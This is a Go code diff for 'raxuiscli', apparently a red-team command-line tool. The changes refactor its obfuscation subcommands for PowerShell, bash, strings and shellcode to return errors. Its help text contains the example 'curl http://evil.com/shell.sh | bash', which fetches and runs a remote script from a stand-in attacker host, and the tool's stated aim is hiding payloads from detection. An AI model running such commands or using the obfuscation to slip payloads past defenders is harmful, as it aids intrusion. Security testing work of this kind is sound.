@@ -25,8 +25,9 @@ Examples:
   raxuiscli obfuscate bash "curl http://evil.com/shell.sh | bash"
   raxuiscli obfuscate string "malicious" --method base64
   raxuiscli obfuscate shellcode shellcode.bin --method xor`,
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		_ = cmd.Help()
+		return nil
 	},
 }
 
@@ -40,11 +41,12 @@ Levels:
   2 - Base64 encoding with IEX
   3 - Random casing and tick insertion`,
 	Args: cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		code := args[0]
 
 		result := obfuscate.ObfuscatePowerShell(code, obfLevel)
 		obfuscate.DisplayResult(result)
+		return nil
 	},
 }
 
@@ -58,11 +60,12 @@ Levels:
   2 - Base64 encoding
   3 - Hex encoding`,
 	Args: cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		code := args[0]
 
 		result := obfuscate.ObfuscateBash(code, obfLevel)
 		obfuscate.DisplayResult(result)
+		return nil
 	},
 }
 
@@ -82,11 +85,12 @@ Methods:
   decimal  - Decimal byte values
   xor      - XOR with random key`,
 	Args: cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		text := args[0]
 
 		result := obfuscate.ObfuscateString(text, obfStringMethod)
 		obfuscate.DisplayResult(result)
+		return nil
 	},
 }
 
@@ -105,17 +109,17 @@ Methods:
   mac      - Format as MAC addresses
   c-array  - C array format`,
 	Args: cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		filePath := args[0]
 
 		data, err := os.ReadFile(filePath)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "Error reading file: %v\n", err)
-			os.Exit(1)
+			return fmt.Errorf("error reading file: %v", err)
 		}
 
 		result := obfuscate.ObfuscateShellcode(data, obfShellcodeMethod)
 		obfuscate.DisplayResult(result)
+		return nil
 	},
 }
 
@@ -124,17 +128,17 @@ var obfShellcodeHexCmd = &cobra.Command{
 	Short: "Obfuscate shellcode from hex string",
 	Long:  `Obfuscate shellcode provided as a hex string.`,
 	Args:  cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		hexStr := args[0]
 
 		data, err := hex.DecodeString(hexStr)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "Error decoding hex: %v\n", err)
-			os.Exit(1)
+			return fmt.Errorf("error decoding hex: %v", err)
 		}
 
 		result := obfuscate.ObfuscateShellcode(data, obfShellcodeMethod)
 		obfuscate.DisplayResult(result)
+		return nil
 	},
 }
 
